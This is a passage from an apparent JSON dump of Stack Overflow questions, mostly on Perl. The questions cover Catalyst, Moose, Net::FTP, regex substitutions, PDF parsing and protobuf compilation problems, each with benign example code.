true,\n    dataType: 'json',\n    timeout: 5000,\n    data: $(\"#create-user-form\").serializeObject(),\n    error: function(jqXHR, textStatus, errorThrown){\n    console.log(\"jQuery ajax error....\");\n},\n); \n</code></pre>\n\n<p>In the controller is the route handler (using <code>Catalyst::Controller::Rest</code>)</p>\n\n<pre><code>sub user_POST {\n        my ($self, $c, $args) = @_;\n    warn Dumper( $c );\n\n...\n }\n</code></pre>\n\n<p>The problem I'm having is, when I make the call from the test the content is\nset in the Catalyst object in a hash with a key called 'data' which can be \naccessed be calling <code>$c-&gt;req-&gt;data</code>.</p>\n\n<p>However, when the ajax call is made from a webpage, the data is \nheld in the Catalyst object in a hash with a key called '<em>parameters</em>' which is\naccessed by calling <code>$c-&gt;req-&gt;parameters</code>.</p>\n\n<p>Anyone know why this is happening and or what to do to work around it?</p>\n"},{"tags":["php","arrays","algorithm","perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":76,"score":0,"question_id":12365258,"title":"How to sort a multidimensional array with values from multidimensional array?","body":"<p>I am developing a test which will give a result of 2 values</p>\n\n<pre><code>$result = array( 't' =&gt; 10, 's' =&gt; 20 );\n</code></pre>\n\n<p>and i have ranges that will give a response as badge name from array to that result:</p>\n\n<pre><code>$badges = array(\n    'badge1' =&gt; array(\n        array('tLow' =&gt; 0, 'tHigh' =&gt; 20),\n        array('sLow' =&gt; 0, 'sHigh' =&gt; 10)\n    ),\n    'badge2' =&gt; array(\n        array('tLow' =&gt; 0, 'tHigh' =&gt; 10),\n        array('sLow' =&gt; 11, 'sHigh' =&gt; 20)\n    ),\n    'badge3' =&gt; array(\n        array('tLow' =&gt; 21, 'tHigh' =&gt; 30),\n        array('sLow' =&gt; 0, 'sHigh' =&gt; 10)\n    ),\n    'badge4' =&gt; array(\n        array('tLow' =&gt; 31, 'tHigh' =&gt; 40),\n        array('sLow' =&gt; 0, 'sHigh' =&gt; 10)\n    ),\n    'badge5' =&gt; array(\n        array('tLow' =&gt; 11, 'tHigh' =&gt; 30),\n        array('sLow' =&gt; 11, 'sHigh' =&gt; 30)\n    ),\n    'badge6' =&gt; array(\n        array('tLow' =&gt; 0, 'tHigh' =&gt; 10),\n        array('sLow' =&gt; 21, 'sHigh' =&gt; 30)\n    ),\n    'badge7' =&gt; array(\n        array('tLow' =&gt; 0, 'tHigh' =&gt; 10),\n        array('sLow' =&gt; 31, 'sHigh' =&gt; 40)\n    ),\n); \n</code></pre>\n\n<p>badge arrays correspond to a grid which looks like this</p>\n\n<pre><code>+---+\n| 7 |\n+---+---+---+\n| 6 |       |\n+---+   5   +\n| 2 |       |\n+---+---+---+---+\n|   1   | 3 | 4 |\n+---+---+---+---+\n</code></pre>\n\n<p>so my question is what is the most effective way to get a badge for my result? maybe there is a better approach to this? </p>\n"},{"tags":["database","perl","dbi"],"answer_count":5,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":222,"score":3,"question_id":830106,"title":"How can I make hundreds of simultaneously running processes communicate with a database through one or few permanent sessions?","body":"<p>Long speech short: <b>How can I make hundreds of simultaneously running processes communicate with a database through one or few permanent sessions?</b></p>\n\n<p>The whole story:<br />\nI once built a number crunching engine that handles vast amounts of large data files by forking off one child after another giving each a small number of files to work on. File locking, progress monitoring and result propagation happen in an Oracle database which all (sub-)processes access at various times using an application-specific module which encapsulates DBI.</p>\n\n<p>This worked well at first, but now with higher volumes of input data, the number of database sessions (one per child, and they can be very short-lived) constantly being opened and closed is becoming an issue. I now want to centralise database access so that there are only one or few fixed database sessions which handle all database access for all the (sub-)processes. The presence of the database abstraction module should make the changes easy because the function calls in the worker instances can stay the same. My problem is that I cannot think of a suitable way to enhance said module in order to establish communication between all the processes and the database connector(s).</p>\n\n<p>I thought of message queueing, but couldn't come up with a way of connecting a large herd of requestors with one or few database connectors in a way so that bidirectional communication is possible (for collecting the query result).<br />\nAn asynchronous approach could help here in that all requests are written to the same queue and the database connector servicing the request will \"call back\" to submit the result. But my mind fails me in generating an image clear enough so that I can paint into code.<br />\nThreading instead of forking might have given me an easier start, but this would now require massive changes to the code base that I'm not prepared to do to a live system.  </p>\n\n<p>The more I think of it, the more the base idea looks like a pre-forked web server to me only that it doesn't serve web pages but database queries. Any ideas on what to dig into, and where? Sample (pseudo) code to inspire me, links to possibly related articles, ready solutions on CPAN maybe?</p>\n"},{"tags":["perl","ftp"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":702,"score":1,"question_id":4329614,"title":"using retr from perl script - 'RETR' not understood","body":"<p>I have a simple Task, In my company we need to download files from ftp server, normaly i've got some scripts and they can handle with this, but on one server i have some problems. When i use system specific ftp command it works fine the file can be downloaded, but when i try to do this from perl I get error \"'RETR' not understood\".</p>\n\n<p>My scripts looks like this</p>\n\n<p>shell:</p>\n\n<p><code>\nftp> debug<br>\nftp> open xx.xx.xx.xx<br>\n220 ProFTPD 1.3.0 Server (ProFTPD Default Installation) [xx.xx.xx.xx]<br>\nftp> cd IN<br>\n---> CWD IN<br>\n250 CWD command successful<br>\nftp> get somefile10112499xxx.ZIP<br>\n---> PORT 3,126,181,35,14,131<br>\n200 PORT command successful<br>\n---> RETR somefile10112499xxx.ZIP<br>\n150 Opening ASCII mode data connection for somefile10112499xxx.ZIP (13299 bytes)<br>\n226 Transfer complete.<br>\nftp: 64d bajtÃ³w odebranych w 0,01Sekund 889,80KbajtÃ³w/sek.<br>\nftp> quit<br>\n---> QUIT<br>\n221 Goodbye.<br>\n</code>\nperl script:</p>\n\n<p><code>use Net::FTP;<br>\n$ftp = Net::FTP->new($FTP_HOST, Debug => 1,Passive=>0) ;<br>\n$ftp->login($FTP_USER,$FTP_PASS) ;<br>\n$ftp->retr(\"somefile10112499xxx.ZIP\");<br>\n$ftp->quit;<br>\n</code>\nI try with passive mode, ascii and binary transmission method, but all of this make \"Net::FTP=GLOB(0x1ee71a0)&lt;&lt;&lt; 500 'RETR' not understood\".</p>\n\n<p>Are there any others parameters define by default in command ftp? Maybe i should make some changes in perl script?</p>\n"},{"tags":["perl","moose"],"answer_count":1,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":61,"score":4,"question_id":12363971,"title":"perl moose triggers in subclasses disrupt method modifiers","body":"<p>I've found that if a subclass adds a trigger, then method modifiers from the base class don't run.  This seems like a Moose bug, or at least non-intuitive.  Here's my example:</p>\n\n<pre><code>package Foo {\n    use Moose;\n\n    has 'foo' =&gt; (\n        is  =&gt; 'rw',\n        isa =&gt; 'Str',\n    );\n\n    before 'foo' =&gt; sub {\n        warn \"before foo\";\n    };\n};\n\npackage FooChild {\n\n    use Moose;\n    extends 'Foo';\n\n    has '+foo' =&gt; ( trigger =&gt; \\&amp;my_trigger, );\n\n    sub my_trigger {\n        warn 'this is my_trigger';\n    }\n};\n\nmy $fc = FooChild-&gt;new();\n$fc-&gt;foo(10);\n</code></pre>\n\n<p>If you run this example, only the \"this is my_trigger\" warn runs, and the \"before\" modifier is ignored.  I'm using Perl 5.14.2 with Moose 2.0402.</p>\n\n<p>Is this correct behavior?  It doesn't seem right, especially since the trigger will fire after the before when the trigger is defined directly in the base class.</p>\n"},{"tags":["regex","perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":12363053,"title":"\"exists\" function while checking for hash value existence","body":"<p>I am trying to replace every occurence of \"EXECUTE func-name\" with \"#  EXECUTE func-name. <em>followed by a hash value</em>\" ONLY if the func-name exists. My regex below doesn't seem to agree with me.</p>\n\n<pre><code>s/EXECUTE ([\\w-]+)\\.?/\"#  EXECUTE $1.\\n\" . $hash{$1}/eg if (exists($hash{$1}));\n</code></pre>\n\n<p>Please advise.</p>\n"},{"tags":["perl","catalyst"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":63,"score":0,"question_id":12361015,"title":"Catalyst - Creating DB dump - Getting \"No tables found, did you forget to specify db_schema?\" on MS SQL Server connection","body":"<p>I'm trying to create a Catalyst project connecting to an existing MS SQL Server database.  I got the correct connection string and it's authenticating, but it's not finding any tables.  Anyone have an idea of what I might be missing?</p>\n\n<p>I substituted the real ip address, database name, username, and password but you get the idea.</p>\n\n<p>This is the command I run:</p>\n\n<pre><code>script\\qa_utility_create.pl model DB DBIC::Schema QA_Utility::Schema create=static \"db_schema=DatabaseName\" \"dbi:ODBC:Driver={sql server};Server=1.1.1.1,1433;Database=DatabaseName\" username password\n</code></pre>\n\n<p>When I run this, I get the below error:</p>\n\n<pre><code>exists \"C:\\strawberry\\perl\\site\\bin\\QA_Utility\\lib\\QA_Utility\\Model\"\nexists \"C:\\strawberry\\perl\\site\\bin\\QA_Utility\\t\"\nDumping manual schema for QA_Utility::Schema to directory C:\\strawberry\\perl\\site\\bin\\QA_Utility\\lib ...\nSchema dump completed.\nWARNING: No tables found, did you forget to specify db_schema?\nexists \"C:\\strawberry\\perl\\site\\bin\\QA_Utility\\lib\\QA_Utility\\Model\\DB.pm\"\n</code></pre>\n"},{"tags":["perl","substr"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":75,"score":1,"question_id":12358469,"title":"Assigning a string to Perl substr?","body":"<p>I am looking at Perl script written by someone else, and I found this:</p>\n\n<pre><code>$num2 = '000000';\nsubstr($num2, length($num2)-length($num), length($num)) = $num;\nmy $id_string = $text.\"_\".$num2\n</code></pre>\n\n<p>Forgive me ignorance, but for an untrained Perl programmer the second line looks as if the author is assigning the string <code>$num</code> to the result of the function <code>substr</code>. What does this line exactly do?</p>\n"},{"tags":["regex","perl"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":76,"score":1,"question_id":12351756,"title":"Perl Regex : Modification of a read-only value attempted","body":"<p>I am trying to replace <code>whitespaces</code> in a string after matching it against a regular expression.</p>\n\n<pre><code>my $string = \"watch download Buffy the Vampire Slayer Season 1 Episode 1 Gorillavid\";\n\nif ($string =~ m!(Season\\s\\d+\\sEpisode\\s\\d+)!){\n\n    $1 =~ s!\\s+!!g;\n\n    say $1;\n\n}\n</code></pre>\n\n<p>Now when I run the above code I get <code>Modification of a read-only value attempted</code>. Now if I store the value of <code>$1</code> in a variable than try to perform a substitution on that variable it works fine.</p>\n\n<p>So, is there any way I can perform a substitution in place without creating a new temporary variable.</p>\n\n<p>PS: Can someone show me how to write the above code as one-liner because I am not able to :)</p>\n"},{"tags":["ajax","json","perl","prototypejs"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":12360061,"title":"json value in prototype showing up as undefined","body":"<p>I am using perl modules and cgi scrips on the backend and prototypejs on the front end. I am basically making use of ajax to make a call to the cgi script running on the server which calls another file to put the sent data inside oracle db.</p>\n\n<p>The fronend script is:</p>\n\n<pre><code>new Ajax.Request ('ajax-sr-update.cgi', {\n    method: 'post',\n    asynchronous: 'false',\n    parameters: { \n        incident_id: incident_id,\n        serial_number: $F('serial_number'),\n        cmd: 'Add Serial'\n    },\n    onSuccess: function(transport) {\n    var json = transport.responseJSON();\n    if (json) {\n        if (json.error_message) {\n            //display error message\n            } \n        else if (json.incident_id) {            \n            //append the output in an alredy displated table\n            var new_row = '&lt;tr id=\"alt-row-'+json.line_number+'\"&gt;';\n                new_row += '&lt;td id=\"serial_number-'+json.incident_id+'\" style=\"border-left: solid 1px #eeeeee;\"&gt;'+json.serial_number+'&lt;/td&gt;';\n                new_row += '&lt;td id=\"product_number-'+json.incident_id+'\"&gt;'+json.product_number+'&lt;/td&gt;';\n                new_row += '&lt;td id=\"transaction_type-'+json.incident_id+'\"&gt;'+json.transaction_type+'&lt;/td&gt;';\n                new_row += '&lt;td id=\"failure_analysis_flag-'+json.incident_id+'\"&gt;'+json.failure_analysis_flag+'&lt;/td&gt;';\n                new_row += '&lt;/tr&gt;';\n                Element.replace('add-loading-row', new_row);\n            } else {\n                //display a general error\n            }\n        } else {\n            //display general message\n        }\n\n    },\n    onFailure: function(data) {\n        //display general error message\n    }\n});\n</code></pre>\n\n<p>The problem that I am facing is all the json returned values show up as undefined when the table is updated, but when I use console.log(json.line_number), I can see the original value. Been working on this thing for past 4 hours, loosing my mind!!. </p>\n\n<p>Things that I have checked:</p>\n\n<ol>\n<li><p>The values are getting out of the database properly, I generated them in the error logs</p></li>\n<li><p>The number of values that are getting generated is also equal to the values needed</p></li>\n<li><p>When I receive the json return it is exactly what is needed.</p></li>\n</ol>\n"},{"tags":["perl","deployment","dependencies","cgi","web-hosting"],"answer_count":1,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":42,"score":4,"question_id":12361683,"title":"CGI to check available Perl version and modules","body":"<p>I am about to write a Perl CGI script that is to be deployed on a host that does not allow shell access. You interact with them through their web interface where you can upload files to the web server, including Perl CGI.</p>\n\n<p>Before I start I would like to check which version of Perl is installed, and if certain CPAN modules are available. I could write my own \"probe.cgi\" to do that, but maybe someone already made such a tool.</p>\n\n<p>Is there a CGI that runs with possibly really old versions of Perl, that you can just drop into any web server and that produces a report about the capabilities of the hosting provider being used?</p>\n"},{"tags":["regex","perl"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":79,"score":1,"question_id":12359001,"title":"replace data after a regex pattern","body":"<p>I have a log file with data I need to mask/replace.\nTest File example</p>\n\n<pre><code>20120910:181649:TID=000ef4:Add       :C155:E076:P:     eTDYN-str-multi-109(String to replace)\n20120910:181649:TID=000ef4:Add       :C155:E076:P:     eTDYN-str-multi-106(String to replace)\n20120910:181649:TID=000ef4:Add       :C155:E076:P:     eTDYN-str-multi-104(String to replace)\n20120910:181649:TID=000ef4:Add       :C155:E076:P:     eTDYN-str-multi-102(String to replace)\n20120910:181649:TID=000ef4:Add       :C155:E076:P:     eTDYN-str-multi-18(String to replace)\n</code></pre>\n\n<p>It has many more of the eTDYN-str, 01-110.</p>\n\n<p>I need to find each instance, one per line, and replace all of the text directly after it.</p>\n\n<p>I was trying something like</p>\n\n<pre><code>perl -pie 's/^(eTDYN-str-multi-\\d\\d:\\s+).*/$1&lt;removed pii data&gt;/g;' logtest.txt\n</code></pre>\n\n<p>I know it would only work for 2 digit number after the text but it's not even finding/replacing it.</p>\n\n<p>Any help would be Appreciated\nThanks</p>\n"},{"tags":["java","python",".net","ruby","perl"],"answer_count":16,"favorite_count":8,"up_vote_count":13,"down_vote_count":3,"view_count":643,"score":10,"question_id":1253232,"title":"Which libraries have been ported to different programming languages?","body":"<p>Since I am working with different Platforms and programming languages, I found there are many good libraries that are ported with different programming language than its original. For example JUnit and Log4j which has been ported into several different languages. Sometimes if I am already used to working with these libraries, I would find the ported version for it if I'm working with another programming language.</p>\n\n<p>What are other libraries that you have found been ported to different languages and as good as the original?</p>\n\n<p>Please make it one library per answer so others can vote.</p>\n\n<p><strong>Format</strong>: </p>\n\n<p>Original-Library-Name, Original-Programming-Language</p>\n\n<ul>\n<li>Ported-Library-Name, Ported-Programming-Language</li>\n</ul>\n\n<p>If possible with the links to the website of the libraries.</p>\n"},{"tags":["perl","pdf"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":71,"score":0,"question_id":12359616,"title":"Trying to parse a pdf in PERL and the output seems to have problems","body":"<p>I tried parsing the following file in PERL using CAM::PDF</p>\n\n<p><a href=\"http://www.roehampton.ac.uk/uploadedFiles/Pages_Assets/PDFs_and_Word_Docs/Human_Resources/VL%20Advert%20Biomedical%20Sciences%20Sep%2012.pdf\" rel=\"nofollow\">http://www.roehampton.ac.uk/uploadedFiles/Pages_Assets/PDFs_and_Word_Docs/Human_Resources/VL%20Advert%20Biomedical%20Sciences%20Sep%2012.pdf</a></p>\n\n<p>But I seem to be getting a lot of newlines than I see when I open the PDF.\nHere is a snapshot of my sample code.</p>\n\n<pre><code>        my $file_name = 'file_3.pdf';\n        my $filecontent;\n        my @lines = '';\n        my $save = \"/home/tejas/Projects/Richmond/pdf/\";\n        $file_name = $save . $file_name;\n        my $doc = CAM::PDF-&gt;new($file_name) || die \"$CAM::PDF::errstr\\n\";\n\nforeach my $p ( 1 .. $doc-&gt;numPages() ) {\n    my $str = $doc-&gt;getPageText($p);\n    if (defined $str) {\n       CAM::PDF-&gt;asciify(\\$str);\n       print  $str;\n    }\n}\n</code></pre>\n\n<p>I have downloaded and stored the pdf from the link to file_3.pdf.\nPlease let me know if there is anything better I can do while parsing to stictch some lines together (especially the ones which are broken in the middle of the word).</p>\n"},{"tags":["perl","batch-file","activeperl","awstats"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":553,"score":2,"question_id":10021164,"title":"how to pass parameters to perl script from batch file","body":"<p>So, I'm wondering how to pass parameters to a perl script from a .bat file in windows. I'm running active perl. If you're wondering why, I'm automating log indexing for awstats+iis.</p>\n\n<p>I can do this fine just typing the command directly:</p>\n\n<pre><code> awstats.pl -config:blahblah.com -update\n</code></pre>\n\n<p>I tried putting that in my batch file directly. I also tried using the standard batch file way:</p>\n\n<pre><code> awstats.pl /config:blahblah.com /update\n</code></pre>\n\n<p>I even tried this, thinking the dash was parsed differently by perl:</p>\n\n<pre><code> awstats.pl /-config:blahblah.com /-update\n</code></pre>\n\n<p>So I thought I'd try escaping the dash (for fun, of course):</p>\n\n<pre><code>  awstats.pl /%-config:blahblah.com /%-update\n</code></pre>\n\n<p>Then I tried the above combinations, attempting to escape the colon:</p>\n\n<pre><code> awstats.pl /config%:blahblah.com /update\n</code></pre>\n\n<p>None of these produced the success screen I get when typing in the command. Yes, I had a pause so I could verify...</p>\n\n<p>Any thoughts? Is there something obvious I'm missing about parameters?</p>\n"},{"tags":["regex","perl"],"answer_count":1,"favorite_count":1,"up_vote_count":8,"down_vote_count":0,"view_count":84,"score":8,"question_id":12359164,"title":"YAPE::Regex::Explain not working with use 5.014;","body":"<p>This code:</p>\n\n<pre><code>use strict;\nuse warnings;\nuse YAPE::Regex::Explain;\nprint YAPE::Regex::Explain-&gt;new( qr/d+/ )-&gt;explain();\n</code></pre>\n\n<p>prints</p>\n\n<pre><code>The regular expression:\n\n(?-imsx:d+)\n\nmatches as follows:\n\nNODE                     EXPLANATION\n----------------------------------------------------------------------\n(?-imsx:                 group, but do not capture (case-sensitive)\n                         (with ^ and $ matching normally) (with . not\n                         matching \\n) (matching whitespace and #\n                         normally):\n----------------------------------------------------------------------\n  d+                       'd' (1 or more times (matching the most\n                           amount possible))\n----------------------------------------------------------------------\n)                        end of grouping\n----------------------------------------------------------------------\n</code></pre>\n\n<p>but this code</p>\n\n<pre><code>use 5.014;  #added this\nuse strict;\nuse warnings;\nuse YAPE::Regex::Explain;\nprint YAPE::Regex::Explain-&gt;new( qr/d+/ )-&gt;explain();\n</code></pre>\n\n<p>prints only:</p>\n\n<pre><code>The regular expression:\n\n\n\nmatches as follows:\n\nNODE                     EXPLANATION\n----------------------------------------------------------------------\n</code></pre>\n\n<p>What's wrong?</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":118,"score":2,"question_id":12359147,"title":"Perl parsing hash of hashes of arrays","body":"<p>I am trying to parse .dmp files that contain a hash of hashes of arrays. I need to get the key value pair from the arrays so I can store them into a mysql database. I've tried several methods but can't get it to work properly. </p>\n\n<p>The code in the files looks like this: \nI need to store one hash of arrays per row in the database</p>\n\n<pre><code>$VAR={  'booktodo-yzi07mwp-1102021083' =&gt; {\n    '_modtime' =&gt; [\n      1102021143\n    ],\n    'version' =&gt; [\n      '25'\n    ],\n    'pubnum' =&gt; [\n      '2332'\n    ],\n    '_status' =&gt; [\n      'active'\n    ],\n    '_user' =&gt; [\n      'lcm'\n    ],\n    'description' =&gt; [\n      'Revise trademarks'\n    ]\n  },\n  'booktodo-p8ekw9d3-1104950962' =&gt; {\n    '_modtime' =&gt; [\n      1104950986\n    ],\n    'version' =&gt; [\n      '3.0'\n    ],\n    'pubnum' =&gt; [\n      'S-2326-30'\n    ],\n    '_status' =&gt; [\n      'active'\n    ],\n    '_user' =&gt; [\n      'malz'\n    ],\n    'description' =&gt; [\n      'Send out a request for install guide changes'\n    ]\n  },\n</code></pre>\n\n<p>This is what I have so far. I am just trying to access the elements in the arrays\nThanks!</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse DBI;\nuse strict;\nuse Data::Dumper;\nuse File::Slurp;\nuse lib \"$ENV{HOME}/modules/lib\";\n\nmy %VAR;\n\n#open DMP;\nopen (FILE, \"&lt;./booktodo.dmp\") or die \"could not open file: $!\";\nundef $/;\n\n\n#store evaled data in %VAR hash\n%VAR = &lt;FILE&gt;;\nclose(FILE);\neval %VAR;\n\nforeach my $loop (keys %VAR){\n    foreach my $hash (keys $VAR{$loop}){\n         for my $i (0..$#{$VAR{$loop}}){\n                print \"$i= $VAR{$loop}[$i]\\n\";\n         }\n    }\n}\n</code></pre>\n"},{"tags":["perl","debugging","emacs"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":46,"score":1,"question_id":12357379,"title":"Setting the path to the interpreter in Emacs for Perl debugging with perldb","body":"<p>When I type <code>M-x perldb</code> to debug my Perl script, the debugging session fails, I think it is because I have a line at the beginning of my script that says:</p>\n\n<pre><code>use 5.010\n</code></pre>\n\n<p>The Emacs Perl debugger complains with:</p>\n\n<pre><code> Perl v5.10.0 required--this is only v5.8.6,\n at /path/to/file\n</code></pre>\n\n<p>I think it's loading an old Perl interpreter (the default one installed in my system). However, I have a much newer interpreter installed on a different path, so how can I tell <code>perldb</code> in Emacs the path to the interpreter that I want it to use?</p>\n"},{"tags":["perl","perl-module","dist-zilla"],"answer_count":1,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":69,"score":3,"question_id":12343268,"title":"Can I have dist-zilla fill in arbitrary fields in a template file?","body":"<p>Is there any way to have a <em>user</em> defined parameter in a file and then have the <code>dist.ini</code> set the value for the parameter. For example, a file might contain <code>{{$THE_ANSWER}}</code> and the <code>dist.ini</code> file would provide a value like <code>THE_ANSWER = 42</code>? I'm pretty new to using <code>dist::zilla</code> to work with perl distributions, and I'm having problems understanding how it treats files as templates. There seem to be only a couple of hard-codeed parameters, varying by plugin, that can be used for any file. One such parameter is the {{$NEXT}} variable made available by <code>[NextRelease]</code> in the <code>Changes</code> file. </p>\n\n<p>I read through the tutorials and searched the modules on CPAN and can't figure out if this is even possible. It is not an acceptable work-around to use the <code>[GenerateFile]</code> plugin to put the whole file in the <code>dist.ini</code> file. Besides a lack of flexibility and just plain ugliness, it doesn't seem possible to add lines with leading white-space that way.</p>\n"},{"tags":["xml","perl"],"answer_count":3,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":41,"score":5,"question_id":12358043,"title":"Building XML file in Perl: Relationship between createAttribute and addChild","body":"<p>I am learning to use <code>XML:LibXML</code> for a project in Perl and I saw <a href=\"http://justatheory.com/computers/programming/perl/xml-generation.html\">this example</a>.</p>\n\n<p>The goal is to build this XML file:</p>\n\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;assets xmlns=\"http://bricolage.sourceforge.net/assets.xsd\"&gt;\n  &lt;story id=\"1234\" type=\"story\"&gt;\n    &lt;name&gt;Catch as Catch Can&lt;/name&gt;\n  &lt;/story&gt;\n&lt;/assets&gt;\n</code></pre>\n\n<p>The author uses <code>addChild</code> to create <code>story</code> under <code>assets</code>:</p>\n\n<pre><code>my $story = $dom-&gt;createElement('story');\n</code></pre>\n\n<p>and he then <strong>also</strong> uses <code>addChild</code> (in combination with <code>createAttribute</code>) to specify the <strong>attributes</strong> for <code>story</code>:</p>\n\n<pre><code>$story-&gt;addChild( $dom-&gt;createAttribute( id =&gt; 1234));\n</code></pre>\n\n<p>Looking at the XML example above (without knowing much about XML), <code>id=\"1234\"</code> is not a <strong>child</strong> of <strong>story</strong> but rather an attribute of it, so why do we use <strong>addChild</strong> in this last line?</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":82,"score":0,"question_id":12357588,"title":"Modification of non-creatable array value attempted","body":"<p>I'm not experienced in perl and I'm having difficulty troubleshooting this error. Any help is appreciated. Script as follows (reported problem on line 40, in bold):</p>\n\n<pre><code>#! /usr/bin/perl\n\nprint \"Please enter filename (without extension): \";\n$input = &lt;&gt;;\nchomp ($input);\n\nprint \"Please enter total no. of sequence in fasta file: \";\n$orig_size= &lt;&gt;*2-1;\nchomp ($orig_size);\n\nopen (INFILE, \"$input.fasta\") or die \"Error opening input file for shuffling!\";\nopen (SHUFFLED, \"&gt;\".\"$input\".\"_shuffled.fasta\") or die \"Error creating shuffled output file!\";\n\n@array = (0); # Need to initialise 1st element in array1&amp;2 for the shift function\n@array2 = (0);\n$i = 1;\n$index = 0;\n$index2 = 0;\n\nwhile (my @line=&lt;INFILE&gt;){\n    while ($i&lt;=$orig_size) { \n\n    $array[$i] = $line[$index];\n    $array[$i]=~ s/(.)\\s/$1/seg;\n\n    $index++;\n    $array2[$i] = $line[$index];\n    $array2[$i]=~ s/(.)\\s/$1/seg;\n\n    $i++;\n    $index++;\n    }\n}\n\nmy $array = shift (@array); \n**my $array2 = shift (@array2);**\nfor ($i = $header_size; --$i; ) { \n    my $j = int rand ($i+1);\n    next if $i == $j;\n    @array[$i,$j] = @array[$j,$i];\n    @array2[$i,$j] = @array2[$j,$i];\n}\n\nwhile ($index2&lt;=$header_size) { \n    print SHUFFLED \"$array[$index2]\\n\";\n    print SHUFFLED \"$array2[$index2]\\n\";\n    $index2++;\n}\nclose(INFILE);\nclose(SHUFFLED);\n</code></pre>\n"},{"tags":["c++","osx","perl","gcc","linker"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":276,"score":2,"question_id":9525971,"title":"How to compile C++ files generated by google's protobuf compiler on OS X (new title, solved)","body":"<h1>Solution:</h1>\n\n<p>Using the <code>-pedantic</code> option to GCC 4.2 makes it very angry with <code>protobuf</code> code. Don't use it.</p>\n\n<hr>\n\n<p>I'm using a Mac. I have a library written in C++, let's call it \"wibble\", along with its source code. I can compile this source with GCC 4.3 from macports (<code>g++-mp-4.3</code>), and can link the resulting library into other stuff as long as I use GCC 4.3.</p>\n\n<p>However, I need to link this into another application (let's call it \"blort\") which will only load libs compiled with the GCC 4.2 that is bundled with OS X 10.6 (because that's what <em>it</em> was built with)</p>\n\n<p>I can, more or less, mess with wibble's <code>Makefile</code> however I may please, but blort is a fixed target. I can write whatever code or build scripts to glue them together I may need. There appears to be no way to get wibble to compile on 4.2 (barring a rewrite, which is out of the question), and the guy who wrote it confirms that.</p>\n\n<p>I am not very familiar with the whole build and linking process in C++, having only been handed this integration, and am completely stumped. Is what I'm trying to achieve even possible? If so, how?</p>\n\n<p>In case it matters, what I'm trying to do is call the methods in wibble from Perl via <a href=\"http://search.cpan.org/perldoc?Inline%3a%3aCPP\" rel=\"nofollow\">Inline::CPP</a>, but I'm willing to write raw XS if I have to (I've done <em>that</em> before, at least). I need to use the system perl so this will easily build and install on other people's machines. :-/</p>\n\n<p><strong>UPDATE, 2012-03-01, 1</strong></p>\n\n<p>I am looking into compiling protobufs using the Mac's compiler, and seeing if I can get wibble to compile with the same compiler using that build of protobufs. I will post the results shortly.</p>\n\n<p><strong>Hrmph</strong> same errors:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>g++ -Wall -Wno-unused-function -Wno-long-long -pedantic -O3 -I/Users/sscaffid/local/include -L/Users/sscaffid/local/lib -fPIC -std=c++98 -c wire.pb.cc\nIn file included from /Users/sscaffid/local/include/google/protobuf/wire_format_lite_inl.h:43,\n                 from wire.pb.cc:10:\n/Users/sscaffid/local/include/google/protobuf/wire_format_lite.h:94: error: comma at end of enumerator list\n/Users/sscaffid/local/include/google/protobuf/wire_format_lite.h:117: error: comma at end of enumerator list\n/Users/sscaffid/local/include/google/protobuf/wire_format_lite.h:132: error: comma at end of enumerator list\nIn file included from wire.pb.cc:10:\n/Users/sscaffid/local/include/google/protobuf/wire_format_lite_inl.h:303: error: extra â;â\n/Users/sscaffid/local/include/google/protobuf/wire_format_lite_inl.h:304: error: extra â;â\n/Users/sscaffid/local/include/google/protobuf/wire_format_lite_inl.h:305: error: extra â;â\n/Users/sscaffid/local/include/google/protobuf/wire_format_lite_inl.h:306: error: extra â;â\n/Users/sscaffid/local/include/google/protobuf/wire_format_lite_inl.h:307: error: extra â;â\n/Users/sscaffid/local/include/google/protobuf/wire_format_lite_inl.h:308: error: extra â;â\nIn file included from wire.pb.cc:11:\n/Users/sscaffid/local/include/google/protobuf/descriptor.h:322: error: comma at end of enumerator list\n/Users/sscaffid/local/include/google/protobuf/descriptor.h:341: error: comma at end of enumerator list\n/Users/sscaffid/local/include/google/protobuf/descriptor.h:352: error: comma at end of enumerator list\n/Users/sscaffid/local/include/google/protobuf/descriptor.h:1206: error: extra â;â\n/Users/sscaffid/local/include/google/protobuf/descriptor.h:1223: error: extra â;â\n/Users/sscaffid/local/include/google/protobuf/descriptor.h:1243: error: extra â;â\n/Users/sscaffid/local/include/google/protobuf/descriptor.h:1249: error: extra â;â\n/Users/sscaffid/local/include/google/protobuf/descriptor.h:1257: error: extra â;â\n/Users/sscaffid/local/include/google/protobuf/descriptor.h:1264: error: extra â;â\n/Users/sscaffid/local/include/google/protobuf/descriptor.h:1274: error: extra â;â\nIn file included from wire.pb.cc:13:\n/Users/sscaffid/local/include/google/protobuf/wire_format.h:226: error: comma at end of enumerator list\nmake: *** [wire.pb.o] Error 